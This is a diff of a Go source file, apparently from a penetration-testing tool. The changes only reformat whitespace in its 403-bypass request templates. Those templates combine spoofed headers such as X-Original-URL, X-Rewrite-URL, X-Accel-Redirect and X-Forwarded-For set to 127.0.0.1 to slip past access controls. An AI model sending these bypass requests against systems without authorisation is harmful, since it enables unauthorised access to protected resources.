@@ -99,8 +99,8 @@ var bypassPathHeaders = []string{
 	"X-Original-URL",
 	"X-Rewrite-URL",
 	"X-Override-URL",
-	"X-Accel-Redirect",  // Nginx 内部重定向头（ref: 403权限绕过另类思路）
-	"X-Forwarded-Path",  // 路径转发头
+	"X-Accel-Redirect", // Nginx 内部重定向头（ref: 403权限绕过另类思路）
+	"X-Forwarded-Path", // 路径转发头
 }
 
 // methodOverrideHeaders 方法覆盖头
@@ -315,9 +315,9 @@ func HeaderBypassStart(url, noauth, auth string, thread int, debug int, noauthBa
 		method: "GET",
 		url:    url + auth,
 		headers: map[string]string{
-			"X-Original-URL":             auth,
-			"X-Custom-IP-Authorization":  "127.0.0.1",
-			"X-Forwarded-For":            "127.0.0.1",
+			"X-Original-URL":            auth,
+			"X-Custom-IP-Authorization": "127.0.0.1",
+			"X-Forwarded-For":           "127.0.0.1",
 		},
 		desc: "Combo[OrigURL+CustomIP+XFF]",
 	})
@@ -376,7 +376,7 @@ func HeaderBypassStart(url, noauth, auth string, thread int, debug int, noauthBa
 		method: "GET",
 		url:    url + auth,
 		headers: map[string]string{
-			"Via":            "1.0 localhost",
+			"Via":               "1.0 localhost",
 			"X-Forwarded-Proto": "http",
 		},
 		desc: "HTTPDowngrade[Via:1.0+Proto:http]",
@@ -387,11 +387,11 @@ func HeaderBypassStart(url, noauth, auth string, thread int, debug int, noauthBa
 		method: "GET",
 		url:    url + auth,
 		headers: map[string]string{
-			"X-Forwarded-For":    "127.0.0.1",
-			"X-Real-IP":          "127.0.0.1",
-			"X-Original-URL":     auth,
-			"X-Rewrite-URL":      auth,
-			"X-Forwarded-Proto":  "https",
+			"X-Forwarded-For":   "127.0.0.1",
+			"X-Real-IP":         "127.0.0.1",
+			"X-Original-URL":    auth,
+			"X-Rewrite-URL":     auth,
+			"X-Forwarded-Proto": "https",
 		},
 		desc: "Combo[XFF+RealIP+OrigURL+RewriteURL+Proto]",
 	})
@@ -399,9 +399,9 @@ func HeaderBypassStart(url, noauth, auth string, thread int, debug int, noauthBa
 		method: "GET",
 		url:    url + noauth,
 		headers: map[string]string{
-			"X-Original-URL":    auth,
-			"X-Accel-Redirect":  auth,
-			"X-Forwarded-For":   "127.0.0.1",
+			"X-Original-URL":   auth,
+			"X-Accel-Redirect": auth,
+			"X-Forwarded-For":  "127.0.0.1",
 		},
 		desc: "Combo[OrigURL+Accel+XFF via noauth]",
 	})
@@ -409,13 +409,13 @@ func HeaderBypassStart(url, noauth, auth string, thread int, debug int, noauthBa
 		method: "GET",
 		url:    url + auth,
 		headers: map[string]string{
-			"X-Forwarded-For":       "127.0.0.1",
-			"X-Forwarded-Host":      "localhost",
-			"X-Forwarded-Proto":     "https",
-			"X-Forwarded-Port":      "443",
-			"X-Real-IP":             "127.0.0.1",
-			"True-Client-IP":        "127.0.0.1",
-			"CF-Connecting-IP":      "127.0.0.1",
+			"X-Forwarded-For":           "127.0.0.1",
+			"X-Forwarded-Host":          "localhost",
+			"X-Forwarded-Proto":         "https",
+			"X-Forwarded-Port":          "443",
+			"X-Real-IP":                 "127.0.0.1",
+			"True-Client-IP":            "127.0.0.1",
+			"CF-Connecting-IP":          "127.0.0.1",
 			"X-Custom-IP-Authorization": "127.0.0.1",
 		},
 		desc: "Combo[AllIPHeaders=127.0.0.1]",
